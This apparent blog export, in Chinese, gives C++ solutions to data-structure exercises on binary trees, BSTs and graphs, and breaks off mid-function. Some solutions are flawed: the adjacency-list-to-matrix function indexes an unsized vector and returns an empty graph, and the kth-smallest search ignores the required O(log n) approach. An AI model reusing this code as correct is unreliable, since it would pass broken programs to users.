<p>在每次递归判断左右子树是否平衡时，需要重新计算其高度，因此引入了大量不必要的计算。而如果某棵树的子树之一已经是非平衡树，那么这棵树一定是非平衡树，根据该性质，可将对平衡的判断改为自底向上进行。以下为自底向上判断平衡的方式，可将时间复杂度优化至 O(n).</p>
<h3 id="O-n"><a href="#O-n" class="headerlink" title="O(n)"></a>O(n)</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">calDepth</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> lDepth <span class="token operator">=</span> <span class="token function">calDepth</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> rDepth <span class="token operator">=</span> <span class="token function">calDepth</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>lDepth <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> rDepth <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> <span class="token function">abs</span><span class="token punctuation">(</span>lDepth <span class="token operator">-</span> rDepth<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token function">max</span><span class="token punctuation">(</span>lDepth<span class="token punctuation">,</span> rDepth<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">bool</span> <span class="token function">isBalanced</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> <span class="token function">calDepth</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="二叉搜索树最大和最小结点"><a href="#二叉搜索树最大和最小结点" class="headerlink" title="二叉搜索树最大和最小结点"></a>二叉搜索树最大和最小结点</h1><h2 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h2><p>设计一个算法，求出给定二叉搜索树中最小和最大的关键字。</p>
<h2 id="解题代码-5"><a href="#解题代码-5" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">calMaxVal</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>right <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> root<span class="token operator">-></span>val<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">calMaxVal</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">calMinVal</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>left <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> root<span class="token operator">-></span>val<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">calMinVal</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> <span class="token function">calMaxMin</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> minVal <span class="token operator">=</span> root<span class="token operator">-></span>left <span class="token operator">==</span> <span class="token keyword">nullptr</span> <span class="token operator">?</span> root<span class="token operator">-></span>val <span class="token operator">:</span> <span class="token function">calMinVal</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> maxVal <span class="token operator">=</span> root<span class="token operator">-></span>right <span class="token operator">==</span> <span class="token keyword">nullptr</span> <span class="token operator">?</span> root<span class="token operator">-></span>val <span class="token operator">:</span> <span class="token function">calMaxVal</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">make_pair</span><span class="token punctuation">(</span>minVal<span class="token punctuation">,</span> maxVal<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>


<h1 id="二叉搜索树值不小于-k-的元素"><a href="#二叉搜索树值不小于-k-的元素" class="headerlink" title="二叉搜索树值不小于 k 的元素"></a>二叉搜索树值不小于 k 的元素</h1><h2 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h2><p>设计一个算法，从大到小输出二叉搜索树中所有值不小于 k 的元素。</p>
<h2 id="解题代码-6"><a href="#解题代码-6" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">printNotSmallerK</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token function">printNotSmallerK</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>val <span class="token operator">>=</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		cout <span class="token operator">&lt;&lt;</span> root<span class="token operator">-></span>val <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token function">printNotSmallerK</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>


<h1 id="查找第k小的元素"><a href="#查找第k小的元素" class="headerlink" title="查找第k小的元素"></a>查找第k小的元素</h1><h2 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h2><p>编写一个递归算法，在一棵有 n 个结点的，随机建立起来的二叉搜索树上查找第 k （1 &lt;= k &lt;= n）小的元素，并返回指向该结点的指针，要求算法的平均时间复杂度为 O(logn)。二叉搜索树中的每个结点除 data, lchild, rchild 等数据成员外，增加一个 count 成员，保存以该结点为根的子树上的结点个数。</p>
<h2 id="解题代码-7"><a href="#解题代码-7" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">TreeNode<span class="token operator">*</span> <span class="token function">findKthNode</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
	TreeNode<span class="token operator">*</span> left <span class="token operator">=</span> <span class="token function">findKthNode</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> left<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">--</span>k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> root<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">findKthNode</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构编程题 图</title>
    <url>/2023/08/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="图定义"><a href="#图定义" class="headerlink" title="图定义"></a>图定义</h1><h2 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">ArcNode</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 边结点</span>
	<span class="token keyword">int</span> verIdx<span class="token punctuation">,</span> weight<span class="token punctuation">;</span>
	ArcNode<span class="token operator">*</span> next<span class="token punctuation">;</span>
	<span class="token function">ArcNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> verIdx<span class="token punctuation">,</span> <span class="token keyword">int</span> weight<span class="token punctuation">,</span> ArcNode<span class="token operator">*</span> next<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">verIdx</span><span class="token punctuation">(</span>verIdx<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">weight</span><span class="token punctuation">(</span>weight<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">next</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">VNode</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 顶点结点</span>
	<span class="token keyword">char</span> vertex<span class="token punctuation">;</span>
	ArcNode<span class="token operator">*</span> first<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">AlGraph</span> <span class="token punctuation">&#123;</span>
	vector<span class="token operator">&lt;</span>VNode<span class="token operator">></span> VNodes<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h2 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">MGraph</span> <span class="token punctuation">&#123;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> vertices<span class="token punctuation">;</span> <span class="token comment">// 顶点集</span>
	vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> edges<span class="token punctuation">;</span> <span class="token comment">// 邻接矩阵</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="邻接表转邻接矩阵"><a href="#邻接表转邻接矩阵" class="headerlink" title="邻接表转邻接矩阵"></a>邻接表转邻接矩阵</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>写出从图的邻接表转化为邻接矩阵的算法。</p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">MGraph <span class="token function">adjList2Matrix</span><span class="token punctuation">(</span>AlGraph<span class="token operator">&amp;</span> AG<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> AG<span class="token punctuation">.</span>VNodes<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	MGraph MG<span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> vertices<span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> edges<span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		vertices<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>AG<span class="token punctuation">.</span>VNodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>vertex<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		ArcNode<span class="token operator">*</span> arc <span class="token operator">=</span> AG<span class="token punctuation">.</span>VNodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>arc <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			edges<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>arc<span class="token operator">-></span>verIdx<span class="token punctuation">]</span> <span class="token operator">=</span> arc<span class="token operator">-></span>weight<span class="token punctuation">;</span>
			arc <span class="token operator">=</span> arc<span class="token operator">-></span>next<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> MG<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="是否存在EL路径"><a href="#是否存在EL路径" class="headerlink" title="是否存在EL路径"></a>是否存在EL路径</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>已知无向连通图 G 由顶点集 V 和 边集 E 组成，当 G 中度为奇数的结点个数为不大于 2 的偶数时，G 存在包含所有边且长度为 |E| 的路径（称为 EL 路径），假设图采用邻接矩阵存储。请设计算法，判断 G 是否存在 EL 路径。</p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">isExistEL</span><span class="token punctuation">(</span>MGraph<span class="token operator">&amp;</span> G<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> deg <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			deg <span class="token operator">+=</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		cnt <span class="token operator">+=</span> deg <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> cnt <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> cnt <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="判断无向图是否为树"><a href="#判断无向图是否为树" class="headerlink" title="判断无向图是否为树"></a>判断无向图是否为树</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p>设计一个算法，判断一个无向图 G 是否为一棵树。</p>
<h2 id="解题代码-2"><a href="#解题代码-2" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">dfs</span><span class="token punctuation">(</span>MGraph<span class="token operator">&amp;</span> G<span class="token punctuation">,</span> <span class="token keyword">int</span> preVex<span class="token punctuation">,</span> <span class="token keyword">int</span> curVex<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span><span class="token operator">&amp;</span> visited<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	visited<span class="token punctuation">[</span>curVex<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> curVex<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>visited<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>curVex<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">!=</span> preVex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>curVex<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">bool</span> flag <span class="token operator">=</span> <span class="token function">dfs</span><span class="token punctuation">(</span>G<span class="token punctuation">,</span> curVex<span class="token punctuation">,</span> i<span class="token punctuation">,</span> visited<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">bool</span> <span class="token function">isTree</span><span class="token punctuation">(</span>MGraph<span class="token operator">&amp;</span> G<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">visited</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">auto</span> flag <span class="token operator">=</span> <span class="token function">dfs</span><span class="token punctuation">(</span>G<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> visited<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="非递归深度优先搜索"><a href="#非递归深度优先搜索" class="headerlink" title="非递归深度优先搜索"></a>非递归深度优先搜索</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><p>写出图的深度优先搜索 DFS 算法的非递归算法（图采用邻接表形式存储）。</p>
<h2 id="解题代码-3"><a href="#解题代码-3" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">nonRecursiveDFS</span><span class="token punctuation">(</span>AlGraph<span class="token operator">&amp;</span> G<span class="token punctuation">,</span> <span class="token keyword">int</span> startIdx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">visited</span><span class="token punctuation">(</span>G<span class="token punctuation">.</span>VNodes<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	stack<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> s<span class="token punctuation">;</span>
	s<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>startIdx<span class="token punctuation">)</span><span class="token punctuation">;</span>
	visited<span class="token punctuation">[</span>startIdx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> curIdx <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		cout <span class="token operator">&lt;&lt;</span> G<span class="token punctuation">.</span>VNodes<span class="token punctuation">[</span>curIdx<span class="token punctuation">]</span><span class="token punctuation">.</span>vertex <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>
		ArcNode<span class="token operator">*</span> arc <span class="token operator">=</span> G<span class="token punctuation">.</span>VNodes<span class="token punctuation">[</span>curIdx<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>arc <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>arc<span class="token operator">-></span>verIdx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				s<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>arc<span class="token operator">-></span>verIdx<span class="token punctuation">)</span><span class="token punctuation">;</span>
				visited<span class="token punctuation">[</span>arc<span class="token operator">-></span>verIdx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			arc <span class="token operator">=</span> arc<span class="token operator">-></span>next<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<h1 id="判断是否存在一点到另一点的路径"><a href="#判断是否存在一点到另一点的路径" class="headerlink" title="判断是否存在一点到另一点的路径"></a>判断是否存在一点到另一点的路径</h1><h2 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h2><p>分别采用基于深度优先遍历和广度优先遍历算法判别以邻接表形式存储的有向图中是否存在由顶点 vi 到顶点 vj 的路径（i ≠ j）。注意，算法中涉及的图的基本操作必须在此存储结构上实现。</p>
<h2 id="解题代码-4"><a href="#解题代码-4" class="headerlink" title="解题代码"></a>解题代码</h2><h3 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">dfs</span><span class="token punctuation">(</span>AlGraph<span class="token operator">&amp;</span> G<span class="token punctuation">,</span> <span class="token keyword">int</span> vi<span class="token punctuation">,</span> <span class="token keyword">int</span> vj<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span><span class="token operator">&amp;</span> visited<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>vi <span class="token operator">==</span> vj<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	visited<span class="token punctuation">[</span>vi<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	ArcNode<span class="token operator">*</span> arc <span class="token operator">=</span> G<span class="token punctuation">.</span>VNodes<span class="token punctuation">[</span>vi<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>arc <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>arc<span class="token operator">-></span>verIdx<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">dfs</span><span class="token punctuation">(</span>G<span class="token punctuation">,</span> arc<span class="token operator">-></span>verIdx<span class="token punctuation">,</span> vj<span class="token punctuation">,</span> visited<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		arc <span class="token operator">=</span> arc<span class="token operator">-></span>next<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">bool</span> <span class="token function">hasPathDFS</span><span class="token punctuation">(</span>AlGraph<span class="token operator">&amp;</span> G<span class="token punctuation">,</span> <span class="token keyword">int</span> vi<span class="token punctuation">,</span> <span class="token keyword">int</span> vj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
